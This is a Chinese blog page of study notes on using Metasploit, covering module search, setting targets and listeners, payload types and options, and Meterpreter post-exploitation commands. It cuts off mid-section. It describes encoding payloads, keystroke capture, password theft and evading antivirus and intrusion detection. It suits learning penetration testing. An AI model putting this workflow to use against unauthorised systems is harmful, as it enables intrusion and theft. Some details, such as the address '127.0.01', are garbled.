<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#222"><meta http-equiv="X-UA-COMPATIBLE" content="IE=edge,chrome=1"><meta name="renderer" content="webkit"><link rel="icon" type="image/ico" sizes="32x32" href="/assets/favicon.ico"><link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png"><link rel="alternate" href="/rss.xml" title="Glad to see U (◦˙▽˙◦)" type="application/rss+xml"><link rel="alternate" href="/atom.xml" title="Glad to see U (◦˙▽˙◦)" type="application/atom+xml"><link rel="alternate" type="application/json" title="Glad to see U (◦˙▽˙◦)" href="https://ctf-learner.github.io/feed.json"><link rel="preconnect" href="https://lf9-cdn-tos.bytecdntp.com"><link rel="preconnect" href="https://at.alicdn.com"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CFredericka%20the%20Great:400,400italic,700,700italic%7CNoto%20Serif%20JP:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic%7CInconsolata:400,400italic,700,700italic&amp;display=swap&amp;subset=latin,latin-ext" media="none" onload="this.media='all'"><link rel="stylesheet" href="/css/app.css?v=0.4.2"><link rel="modulepreload" href="/js/chunk-LH3UUIAZ.js"><link rel="modulepreload" href="/js/chunk-QRJM7WWL.js"><link rel="modulepreload" href="/js/chunk-RAMJ2IY5.js"><link rel="modulepreload" href="/js/chunk-S3F4KD3R.js"><link rel="modulepreload" href="/js/chunk-YVJPANCJ.js"><link rel="modulepreload" href="/js/comments-YV65DDGU.js"><link rel="modulepreload" href="/js/index.esm-5SVDFJ47.js"><link rel="modulepreload" href="/js/post-RDTJBKFB.js"><link rel="modulepreload" href="/js/quicklink-JZA437DS.js"><link rel="modulepreload" href="/js/search-QNBO6RKT.js"><link rel="modulepreload" href="/js/siteInit.js"><link rel="stylesheet" href="https://npm.webcache.cn/@waline/client@3.0.0-alpha.11/dist/waline.css" media="none" onload="this.media='all'"><link rel="preload" href="https://s2.loli.net/2024/04/15/HMEdDYN2nFth9PR.webp" as="image" fetchpriority="high"><link rel="preload" href="https://s2.loli.net/2024/04/15/FekDvbXOnpcILV8.webp" as="image" fetchpriority="high"><link rel="preload" href="https://s2.loli.net/2024/04/15/G9n7dTeFO1v5puM.webp" as="image" fetchpriority="high"><link rel="preload" href="https://s2.loli.net/2024/04/15/Ehvinl4RrzboNUP.webp" as="image" fetchpriority="high"><link rel="preload" href="https://s2.loli.net/2024/04/15/KrbhfONjZvedSTm.webp" as="image" fetchpriority="high"><link rel="preload" href="https://s2.loli.net/2024/04/13/FJ7Xahnfd8lg1I4.jpg" as="image" fetchpriority="high"><meta name="keywords" content="kali tools,"><meta name="description" content="Never hack for profit"><link rel="canonical" href="https://ctf-learner.github.io/post/MSF-%E4%B8%87%E5%8D%83waf%E4%B8%AD%E5%8F%96ROOT%E9%A6%96%E7%BA%A7/"><title>MSF---万千waf中取ROOT首级</title><meta name="generator" content="Hexo 7.1.1"></head><body itemscope="" itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope="" itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">MSF---万千waf中取ROOT首级</h1><div class="meta"><span class="item" title="创建时间：2024-05-04 21:59:11"><span class="icon"><i class="ic i-calendar"></i></span><span class="text">发表于</span><time itemprop="dateCreated datePublished" datetime="2024-05-04T21:59:11+08:00">2024-05-04</time></span><span class="item" title="本文字数"><span class="icon"><i class="ic i-pen"></i></span><span class="text">本文字数</span><span>17k</span><span class="text">字</span></span><span class="item" title="阅读时长"><span class="icon"><i class="ic i-clock"></i></span><span class="text">阅读时长</span><span>16 分钟</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span><span class="line"></span><span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">MorIo24's blog</a></li></ul><ul class="right" id="rightNav"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div class="pjax" id="imgs"><ul><li class="item" style="background-image: url(&quot;https://s2.loli.net/2024/04/15/HMEdDYN2nFth9PR.webp&quot;);"></li><li class="item" style="background-image: url(&quot;https://s2.loli.net/2024/04/15/FekDvbXOnpcILV8.webp&quot;);"></li><li class="item" style="background-image: url(&quot;https://s2.loli.net/2024/04/15/G9n7dTeFO1v5puM.webp&quot;);"></li><li class="item" style="background-image: url(&quot;https://s2.loli.net/2024/04/15/Ehvinl4RrzboNUP.webp&quot;);"></li><li class="item" style="background-image: url(&quot;https://s2.loli.net/2024/04/15/KrbhfONjZvedSTm.webp&quot;);"></li><li class="item" style="background-image: url(&quot;https://s2.loli.net/2024/04/13/FJ7Xahnfd8lg1I4.jpg&quot;);"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"></path></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"></use><use xlink:href="#gentle-wave" x="48" y="3"></use><use xlink:href="#gentle-wave" x="48" y="5"></use><use xlink:href="#gentle-wave" x="48" y="7"></use></g></svg></div><main><div class="inner"><div class="pjax" id="main"><div class="article wrap"><div class="breadcrumb" itemlistelement="" itemscope="" itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i><span><a href="/">首页</a></span><i class="ic i-angle-right"></i><span class="current" itemprop="itemListElement" itemscope="itemscope" itemtype="https://schema.org/ListItem"><a href="/categories/Penetration-Test/" itemprop="item" rel="index" title="分类于Penetration Test"><span itemprop="name">Penetration Test<meta itemprop="position" content="0"></span></a></span></div><article class="post block" itemscope="itemscope" itemtype="http://schema.org/Article" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://ctf-learner.github.io/post/MSF-%E4%B8%87%E5%8D%83waf%E4%B8%AD%E5%8F%96ROOT%E9%A6%96%E7%BA%A7/"><span hidden="hidden" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="image" content="/assets/avatar.jpg"><meta itemprop="name" content="MorIo24"><meta itemprop="description" content="Never hack for profit, Never hack for profit"></span><span hidden="hidden" itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="Glad to see U (◦˙▽˙◦)"></span><div class="body md" itemprop="articleBody"><p><span class="label success">上次更新时间：2024-05-04</span><br>
😖😖<span class="spoiler bulr" title="你知道得太多了">还未学习完…… 就要进入期末了捏，先发一点吧</span>😖😖</p>
<h1 id="metasploit工具"><a class="anchor" href="#metasploit工具">#</a> <a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.metasploit.com/">Metasploit 工具</a></h1>
<blockquote>
<p>Metasploit 是一个免费的框架，通过它可以很容易的对计算机软件漏洞实施攻击。它本身附带数百个已知软件漏洞的专业级漏洞攻击工具。<br>
Metasploit 的设计初衷是打造一个<mark>攻击工具开发平台</mark>。</p>
</blockquote>
<p>对于 kali 用户：kali 在更新系统时会自动更新 msf</p>
<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tbody><tr><td data-num="1"></td><td><pre><span class="token function">apt</span> update 					<span class="token comment"># 更新安装包信息；只检查，不更新（已安装的软件包是否有可用的更新，给出汇总报告）</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">apt</span> upgrade 				<span class="token comment"># 更新已安装的软件包，不删除旧包；</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">apt</span> full-upgrade			<span class="token comment"># 升级包，删除旧包</span></pre></td></tr></tbody></table></figure><p>而<strong>非 kali</strong> 一开始大多会是这个状况</p>
<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tbody><tr><td data-num="1"></td><td><pre>┌──<span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="2"></td><td><pre>└─<span class="token comment"># msfupdate</span></pre></td></tr><tr><td data-num="3"></td><td><pre>msfupdate is no longer supported when Metasploit is part of the operating</pre></td></tr><tr><td data-num="4"></td><td><pre>system. Please use <span class="token string">'apt update; apt install metasploit-framework'</span></pre></td></tr></tbody></table></figure><p>然后 <code>apt update; apt install metasploit-framework</code></p>
<p>再用 <code>msfconsole</code>  打开</p>
<h1 id="基础使用"><a class="anchor" href="#基础使用">#</a> 基础使用</h1>
<p>msf 的根目录是 <code>/usr/share/metasploit-framework/</code></p>
<p>7 个基础模块：Exploits（渗透攻击模块），Auxiliary（辅助模块），Post（后渗透攻击模块），Payloads（攻击载荷模块），Encoders（编码器模块），Nops（空指令模块），Evasion（规避模块）</p>
<blockquote>
<p>可以把 msfupdate 理解为是一个自动化攻击的工具，需要你选择好模块，填写参数，然后发动攻击。</p>
</blockquote>
<p>exp 位置： <code>/usr/share/metasploit-framework/modules/exploits</code></p>
<h1 id="初始化metasploit"><a class="anchor" href="#初始化metasploit">#</a> 初始化 metasploit</h1>
<p><strong>在 kali 右上角应用搜索 Metasploit，会自动打开并启动 PostgreSQL 数据库</strong></p>
<p>（非 kali 环境的 Linux 环境下才需要这么做👇）</p>
<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tbody><tr><td data-num="1"></td><td><pre>msfconsole  <span class="token comment"># 打开 metasploit  </span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">service</span> postgresql start </pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment"># metasploit 主要使用 PostgreSQL 数据库存储数据，在使用时需要启动 PostgreSQL 数据库</span></pre></td></tr><tr><td data-num="4"></td><td><pre>msfdb init</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment"># msfdb init 命令创建和初始化数据库  </span></pre></td></tr><tr><td data-num="6"></td><td><pre>connect <span class="token operator">&lt;</span>ip<span class="token operator">&gt;</span>:<span class="token operator">&lt;</span>port<span class="token operator">&gt;</span> <span class="token comment"># 远程连接主机</span></pre></td></tr></tbody></table></figure><h1 id="进入msf"><a class="anchor" href="#进入msf">#</a> 进入 msf</h1>
<p>交互式 shell 提示： <code>msf&gt;</code> ，后面还会有 <code>meterpreter&gt;</code> ，两者有不同</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>支持调用外部命令，所有 kali 的其他工具都是支持的，如 nc、nmap、Hydra、searchsploit 等等</p>
</li>
<li class="lvl-2">
<p>支持<span class="kbd red"> tab</span> 补全功能，简直人性化到爆炸</p>
</li>
<li class="lvl-2">
<p>支持系统命令，可以直接操作 kali，ls、cd、cat、cp 等等</p>
</li>
<li class="lvl-2">
<p>基本命令：exit、history、save（保存活动数据存储）、sessions （转储会话列表并显示有关会话的信息）、back（回退）</p>
</li>
<li class="lvl-2">
<p>先学了常用的，更多命令 help 命令查看</p>
<details class="info"><summary>help命令查看msf所有：</summary><div>
<ol>
<li class="lvl-5"><strong>核心命令（Core Commands）</strong>：
<ul class="lvl-5">
<li class="lvl-7">用于管理 Metasploit 控制台的基本功能，包括帮助、更改工作目录、显示 banner、连接到目标主机、显示调试信息等等。</li>
</ul>
</li>
<li class="lvl-5"><strong>模块命令（Module Commands）</strong>：
<ul class="lvl-5">
<li class="lvl-7">用于管理 Metasploit 中的模块，包括搜索、加载、配置、执行和显示模块信息等。</li>
</ul>
</li>
<li class="lvl-5"><strong>任务命令（Job Commands）</strong>：
<ul class="lvl-5">
<li class="lvl-7">用于管理 Metasploit 中的任务，包括启动、显示、杀死和重命名任务等。</li>
</ul>
</li>
<li class="lvl-5"><strong>资源脚本命令（Resource Script Commands）</strong>：
<ul class="lvl-5">
<li class="lvl-7">用于运行和管理 Metasploit 中的资源脚本，可以将一系列命令保存到文件中，并在需要时执行。</li>
</ul>
</li>
<li class="lvl-5"><strong>数据库后端命令（Database Backend Commands）</strong>：
<ul class="lvl-5">
<li class="lvl-7">用于管理 Metasploit 数据库中的数据，包括主机、服务、漏洞、凭据等。</li>
</ul>
</li>
<li class="lvl-5"><strong>凭据后端命令（Credentials Backend Commands）</strong>：
<ul class="lvl-5">
<li class="lvl-7">用于管理 Metasploit 数据库中的凭据信息。</li>
</ul>
</li>
<li class="lvl-5"><strong>开发者命令（Developer Commands）</strong>：
<ul class="lvl-5">
<li class="lvl-7">用于开发和调试模块，包括编辑、调试、显示日志、重新加载库文件等。</li>
</ul>
</li>
<li class="lvl-5"><strong>DNS 命令（DNS Commands）</strong>：
<ul class="lvl-5">
<li class="lvl-7">用于管理 Metasploit 的 DNS 解析行为。<br>
----From 🤖GPT</li>
</ul>
</li>
</ol>
</div></details>
</li>
</ul>
<h1 id="创建工作区"><a class="anchor" href="#创建工作区">#</a> 创建工作区</h1>
<pre><code class="language-msf">workspace -a [name] # -a选项表示添加工作区 
worksapace # 查看当前所在的工作区  -v查看相关信息 -d删除工作区 -D删除所有工作区
worksapace [工作区] # 切换工作区
worksapace -r [工作区] [工作区] # 重命名工作区
</code></pre>
<div class="note info">
<p>建议每次针对渗透测试创建一个工作区，避免数据混淆。这是个好习惯。</p>
</div>
<h1 id="导入扫描报告"><a class="anchor" href="#导入扫描报告">#</a> 导入扫描报告</h1>
<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tbody><tr><td data-num="1"></td><td><pre><span class="token comment"># 从数据库中导入</span></pre></td></tr><tr><td data-num="2"></td><td><pre>db_status    <span class="token comment"># 查看数据库状态</span></pre></td></tr><tr><td data-num="3"></td><td><pre>db_import    <span class="token comment"># 查看支持的报告格式</span></pre></td></tr><tr><td data-num="4"></td><td><pre>db_import <span class="token operator">&lt;</span>filename<span class="token operator">&gt;</span> <span class="token punctuation">[</span>file2 <span class="token punctuation">..</span>.<span class="token punctuation">]</span> <span class="token comment"># 扫描报告</span></pre></td></tr></tbody></table></figure><h1 id="手动查询"><a class="anchor" href="#手动查询">#</a> 手动查询</h1>
<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tbody><tr><td data-num="1"></td><td><pre>search <span class="token punctuation">[</span>options<span class="token punctuation">]</span> <span class="token operator">&lt;</span>keywords<span class="token operator">&gt;</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment"># 例如</span></pre></td></tr><tr><td data-num="3"></td><td><pre>search smb_ms17_010</pre></td></tr></tbody></table></figure><ul class="lvl-0">
<li class="lvl-2">
<p>-o &lt;file&gt;: 指定输出信息的保存文件，格式为 CSV</p>
</li>
<li class="lvl-2">
<p>-S &lt;string&gt;: 指定搜索的字符串</p>
</li>
<li class="lvl-2">
<p>-u：指定搜索模块<br>
找到模块之后可以通过路径进入该模块，查询 payload</p>
</li>
<li class="lvl-2">
<p>search 支持的查找方式：</p>
<table>
<thead>
<tr>
<th>形式</th>
<th>查询模式</th>
<th>实例</th>
</tr>
</thead>
<tbody>
<tr>
<td>path:</td>
<td>通过路径去查找</td>
<td>search path:mysql</td>
</tr>
<tr>
<td>platform:</td>
<td>相关平台（比 path 范围小）</td>
<td>search platform:mysql</td>
</tr>
<tr>
<td>type:</td>
<td>通过类型查找</td>
<td>search type:exploit</td>
</tr>
<tr>
<td>cve:</td>
<td>在 CVE 数据库中查找</td>
<td>search cve:CVE-2017-8464</td>
</tr>
</tbody>
</table>
<p>可以同时使用多个形式的查找，例如：</p>
<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tbody><tr><td data-num="1"></td><td><pre>search cve:2018 name:linux  <span class="token comment"># 寻找 2018 年与 Linux 有关的 CVE 漏洞模块</span></pre></td></tr></tbody></table></figure><h1 id="使用模块"><a class="anchor" href="#使用模块">#</a> 使用模块</h1>
</li>
</ul>
<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tbody><tr><td data-num="1"></td><td><pre>use <span class="token punctuation">[</span>路径<span class="token punctuation">]</span>       <span class="token comment"># 进入模块，例如</span></pre></td></tr><tr><td data-num="2"></td><td><pre>use auxiliary/scanner/smb/smb_ms17_010</pre></td></tr><tr><td data-num="3"></td><td><pre>info            <span class="token comment"># 查看漏洞模块的具体信息</span></pre></td></tr><tr><td data-num="4"></td><td><pre>info <span class="token parameter variable">-d</span>         <span class="token comment"># 用 html 打开详细信息，傻瓜式教学如何使用这个模块</span></pre></td></tr><tr><td data-num="5"></td><td><pre>show targets    <span class="token comment"># 查看可攻击的系统版本</span></pre></td></tr><tr><td data-num="6"></td><td><pre>show payloads   <span class="token comment"># 查询 payload</span></pre></td></tr><tr><td data-num="7"></td><td><pre>show options    <span class="token comment"># 查看需要配置的参数  （yes 为必填参数）</span></pre></td></tr><tr><td data-num="8"></td><td><pre>show missing    <span class="token comment"># 查看缺失什么必填项</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token builtin class-name">set</span> <span class="token punctuation">[</span>参数<span class="token punctuation">]</span> <span class="token punctuation">[</span>值<span class="token punctuation">]</span>  <span class="token comment"># 填写参数，例如：</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token builtin class-name">set</span> payload <span class="token punctuation">[</span>值<span class="token punctuation">]</span>   <span class="token comment">#设置 payload</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token builtin class-name">set</span> RHOST <span class="token number">192.168</span>.10.2  <span class="token comment"># 设置攻击地址</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token builtin class-name">set</span> LHOST <span class="token number">127.0</span>.01  <span class="token comment"># 设置监听地址</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token comment"># 设置全部完成，开始执行渗透</span></pre></td></tr><tr><td data-num="14"></td><td><pre>exploit  <span class="token comment"># 或者 run 。开始执行</span></pre></td></tr></tbody></table></figure><div class="note info">
<p>🌟🌟msf&gt; 下连按两次<span class="kbd green"> tab</span>，会列出可用拓展</p>
</div>
<p>show evasion 用于混淆，show advanced 高级属性。post 模块后面再学<br>
<strong>如果没有会话产生表示没有成功。</strong></p>
<p>使用 <code>show options</code>  可以看到 metasploit 自动帮我们设置了监听地址，但是还是建议将监听地址改为<span class="kbd red"> 127.0.01</span>，避免 kali 在修改网络适配器导致监听失败的问题。</p>
<h1 id="payload"><a class="anchor" href="#payload">#</a> payload</h1>
<p>payloads 也称 shellcode。主要是用来建立目标机与攻击机稳定连接的，可反弹 shell，也可以进行程序注入等。</p>
<p>一般选定了 exploit 之后调用 payload，进入某个模块之后 <code>set payload [选项]</code>  设置 payload，也可以使用 generate 命令直接生成 payload。</p>
<p>Metasploit 中的 Payload 模块主要有以下三种类型：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>Single</strong>：是一种完全独立的 Payload，就像运行.exe 一样。由于 Single Payload 是完全独立的，因此它们有可能会被类似 netcat 这样的非 metasploit 处理工具所捕捉到。</p>
</li>
<li class="lvl-2">
<p><strong>Stager</strong>: 这种 Payload 负责建立目标用户与攻击者之间的网络连接，并下载额外的组件或应用程序。分为两种类型：</p>
</li>
<li class="lvl-2">
<ul class="lvl-2">
<li class="lvl-4">1️⃣ reverse_tcp，让目标系统与攻击者建立一条 tcp 连接，让目标系统主动连接我们的端口 (即反弹 shell)。</li>
<li class="lvl-4">2️⃣bind_tcp，让目标系统开启一个 tcp 监听器，而攻击者可以与目标系统进行通信 (反向反弹 shell)。</li>
</ul>
</li>
<li class="lvl-2">
<p>Stage：是 Stager Payload 下的一种 Payload 组件，这种 Payload 可以提供更加高级的功能，而且没有大小限制。</p>
</li>
<li class="lvl-2">
<ul class="lvl-2">
<li class="lvl-4">stagers 建立连接后，攻击机将 stages 传输给目标机，由 stagers 进行相应处理，将控制权转交给 stages。</li>
</ul>
</li>
</ul>
<p>show payload 后展示所有 payload，</p>
<table>
<thead>
<tr>
<th>#</th>
<th>Name</th>
<th>Rank</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>序号</td>
<td>命名（系统 /payload 类型 / 规则）</td>
<td>危害等级</td>
<td>具体描述</td>
</tr>
</tbody>
</table>
<p>在 Name 的命名规则是：</p>
<details class="primary"><summary>表格请竖向查看，横向没有联系</summary><div>
<table>
<thead>
<tr>
<th>架构</th>
<th>payload 类型</th>
<th>规则</th>
</tr>
</thead>
<tbody>
<tr>
<td>Windows</td>
<td>shell : 得到一个 shell</td>
<td>reverse_tcp : 反向建立 tcp 连接（反弹 shell）</td>
</tr>
<tr>
<td>apple_ios</td>
<td>Dllinject ：上传 DLL 并注入到进程</td>
<td>bind_tcp ：建立一个监听 TCP 连接。</td>
</tr>
<tr>
<td>Linux</td>
<td>Patchup：补丁漏洞</td>
<td>shell_find_tag ： 在一个已建立的链接上创建一个 shell</td>
</tr>
<tr>
<td>Android</td>
<td>Upexec : 上传并执行一个文件</td>
<td>shell_reverse_tcp : 反向连接到攻击者主机并创建一个 shell</td>
</tr>
<tr>
<td>AIX</td>
<td>Meterpreter：高级 payload</td>
<td>reverse_http: 通过 HTTP 隧道通信兵创建一个新用户添加到管理组</td>
</tr>
<tr>
<td>php</td>
<td>Vncinject：高级 payload</td>
<td>add_user : 创建一个新用户并添加到管理组</td>
</tr>
<tr>
<td>Java</td>
<td>PassiveX：高级 payload</td>
<td>xxx_ipv6_tcp ： 基于 IPv6</td>
</tr>
<tr>
<td>等等</td>
<td></td>
<td>xxx_nonx_tcp ：非 No eXecute 或 win 7（N 是应用在 CPU 的一种可以防止缓冲区溢出的技术）</td>
</tr>
<tr>
<td></td>
<td></td>
<td>xxx_tcp_allports ： 在所有可能的端口</td>
</tr>
</tbody>
</table>
</div></details>
<p>直接使用 payload：</p>
<p>一般我们是在 exploit 中调用 payload，如果想直接使用 payload，可以使用  <code>generate</code>  命令来生成 payload。</p>
<details class="primary"><summary>参数👇</summary><div>
<table>
<thead>
<tr>
<th>选项</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>-p / --payload</td>
<td>指定 payload 的路径</td>
</tr>
<tr>
<td>-t /  --template</td>
<td>payload 的输出格式，默认是给 ruby 语言使用的 16 进制编码表示</td>
</tr>
<tr>
<td>-b</td>
<td>过滤坏字符或者指定应避免使用的字符</td>
</tr>
<tr>
<td>-e  /--encoder</td>
<td>指定 encoder 编码（默认不使用 encoder）   如：x86/shikata_ga_nai</td>
</tr>
<tr>
<td>-i</td>
<td>加密轮数</td>
</tr>
<tr>
<td>-k</td>
<td>执行过程中不会产生新的进程，会在当前进程中产生线程，隐蔽性高些</td>
</tr>
<tr>
<td>-x</td>
<td>指定要在生成的 payload 中执行的命令</td>
</tr>
<tr>
<td>-a / -arch</td>
<td>指定目标架构。例如， <code>x86</code>  或  <code>x64</code> 。</td>
</tr>
<tr>
<td>-f</td>
<td>指定输出的格式，如  <code>ruby</code> ,  <code>python</code> ,  <code>perl</code> ,  <code>c</code> ,  <code>go</code>  等。</td>
</tr>
<tr>
<td>-v</td>
<td>为生成的 payload 分配一个变量名。这在将 payload 嵌入脚本时很有用。</td>
</tr>
<tr>
<td>-n 或 --nop</td>
<td>指定要添加到 payload 前面的 NOP 滑动指令的数量。</td>
</tr>
<tr>
<td>-o  / --output</td>
<td>保存到指定文件中</td>
</tr>
<tr>
<td>-s /  --space</td>
<td>指定可用的空间量， <code>msfpayload</code>  会尝试在这个大小内生成 payload。</td>
</tr>
<tr>
<td>--lport &lt;ip&gt;</td>
<td>设置反向连接类型的 payload 的监听端口（LPORT）。</td>
</tr>
<tr>
<td>--lhost &lt;ip&gt;</td>
<td>设置反向连接类型的 payload 的监听主机地址（LHOST）。</td>
</tr>
</tbody>
</table>
<p>支持的 payload 的输出格式：bash，c，hex，java，js，pl，powershell，py，python，raw，rb，ruby，sh，vbscript，asp，dll，elf，exe，jar，msipsh，psh-cmd， vba，vbi-exe，vba-psh，vbs，war 等等（几乎涵盖所有语言）</p>
</div></details>
<ul class="lvl-0">
<li class="lvl-2">
<p>kali 中也支持在 msf 外使用 <code>msfvenom</code>  命令直接生成 payload，后面再学。</p>
</li>
</ul>
<p>参考<a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.cnblogs.com/dogecheng/p/11478953.html"> MSF——Payload 模块（二） - 那少年和狗</a></p>
<h1 id="通过cve网站查找"><a class="anchor" href="#通过cve网站查找">#</a> 通过 CVE 网站查找</h1>
<p>看看教程吧，不会就<a target="_blank" rel="noopener external nofollow noreferrer" href="http://t.csdnimg.cn/hrTPb">戳这</a></p>
<h1 id="后渗透阶段"><a class="anchor" href="#后渗透阶段">#</a> 后渗透阶段</h1>
<p>即已经通过 payload 拿到了 shell 之后，通常都是残疾的 shell。metasploit 开启一个会话 <code>meterpreter&gt; ...</code></p>
<div class="note primary">
<ol>
<li class="lvl-3">
<p>Meterpreter 是 Metasploit 框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。使用它作为攻击载荷能够获得目标系统的一个 Meterpreter shell 的链接。</p>
</li>
<li class="lvl-3">
<p>Meterpreter shell 作为渗透模块有很多有用的功能，比如添加一个用户、隐藏一些东西、打开 shell、得到用户密码、上传下载远程主机的文件、运行 cmd.exe、捕捉屏幕、得到远程控制权、捕获按键信息、清除应用程序、显示远程主机的系统信息、显示远程机器的网络接口和 IP 地址等信息。</p>
</li>
<li class="lvl-3">
<p>另外 Meterpreter 能够躲避入侵检测系统。在远程主机上隐藏自己，它不改变系统硬盘中的文件，因此 HIDS [基于主机的入侵检测系统] 很难对它做出响应。此外它在运行的时候系统时间是变化的，所以跟踪它或者终止它非常困难。</p>
</li>
<li class="lvl-3">
<p>Meterpreter 的工作模式是纯内存的，好处是启动隐藏，很难被杀毒软件监测到。不需要访问目标主机磁盘，所以也没什么入侵的痕迹。</p>
</li>
</ol>
</div>
<h2 id="基本命令"><a class="anchor" href="#基本命令">#</a> 基本命令</h2>
<div class="note info">
<p>以下命令是针对 meterpreter 当前会话的操作。<br>
meterpreter&gt; 支持 tab 命令补全</p>
</div>
<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tbody><tr><td data-num="1"></td><td><pre><span class="token builtin class-name">help</span>              <span class="token comment"># 查看 Meterpreter 帮助</span></pre></td></tr><tr><td data-num="2"></td><td><pre>background        <span class="token comment"># 返回，把 meterpreter 后台挂起</span></pre></td></tr><tr><td data-num="3"></td><td><pre>bgkill            <span class="token comment"># 杀死一个背景 meterpreter 脚本</span></pre></td></tr><tr><td data-num="4"></td><td><pre>bglist            <span class="token comment"># 提供所有正在运行的后台脚本的列表</span></pre></td></tr><tr><td data-num="5"></td><td><pre>run和bgrun        <span class="token comment"># 前台和后台执行以后它选定的 meterpreter 脚本</span></pre></td></tr><tr><td data-num="6"></td><td><pre>channel           <span class="token comment"># 显示活动频道</span></pre></td></tr><tr><td data-num="7"></td><td><pre>sessions <span class="token parameter variable">-i</span> n <span class="token comment"># 与会话进行交互，n 表示第 n 个 session, 使用 session -i 连接到指定序号的 meterpreter 会话已继续利用</span></pre></td></tr><tr><td data-num="8"></td><td><pre>sesssions <span class="token parameter variable">-k</span>  number <span class="token comment">#与会话进行交互</span></pre></td></tr><tr><td data-num="9"></td><td><pre>close             <span class="token comment"># 关闭通道</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token builtin class-name">exit</span>              <span class="token comment"># 终止 meterpreter 会话</span></pre></td></tr><tr><td data-num="11"></td><td><pre>quit              <span class="token comment"># 终止 meterpreter 会话</span></pre></td></tr><tr><td data-num="12"></td><td><pre>interact <span class="token function">id</span>       <span class="token comment"># 切换进一个信道</span></pre></td></tr><tr><td data-num="13"></td><td><pre>run               <span class="token comment"># 执行一个已有的模输入 run 后按两下 tab，会列出所有</span></pre></td></tr><tr><td data-num="14"></td><td><pre>irb               <span class="token comment"># 进入 Ruby 脚本模式</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token builtin class-name">read</span>              <span class="token comment"># 从通道读取数据</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token function">write</span>             <span class="token comment"># 将数据写入到一个通道</span></pre></td></tr><tr><td data-num="17"></td><td><pre>use               <span class="token comment"># 加载 meterpreter 的扩展</span></pre></td></tr><tr><td data-num="18"></td><td><pre>load/use          <span class="token comment"># 加载拓展库中的模块</span></pre></td></tr><tr><td data-num="19"></td><td><pre>Resource          <span class="token comment"># 执行一个已有的 rc 脚本，.rc 文件</span></pre></td></tr></tbody></table></figure><p>⭐留意一下： <code>load</code> 、 <code>run</code>  之后两下<span class="kbd yellow"> tab</span> 会列出所有的已有的脚本，常用的有 autoroute，hashdump，arp_scanner，multi_meter_inject 等</p>
<h2 id="文件操作"><a class="anchor" href="#文件操作">#</a> 文件操作</h2>
<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tbody><tr><td data-num="1"></td><td><pre>getwd <span class="token punctuation">;</span> <span class="token builtin class-name">pwd</span>  <span class="token operator">&amp;&amp;</span> lpwd      <span class="token comment"># 查看当前工作目录  </span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">ls</span>  <span class="token operator">&amp;&amp;</span>  lls   </pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token builtin class-name">cd</span>  <span class="token operator">&amp;&amp;</span>  lcd               <span class="token comment"># lcd/lpwd/lls 作用于本地</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token function">mkdir</span> lltest2             <span class="token comment"># 只能在当前目录下创建文件夹</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span 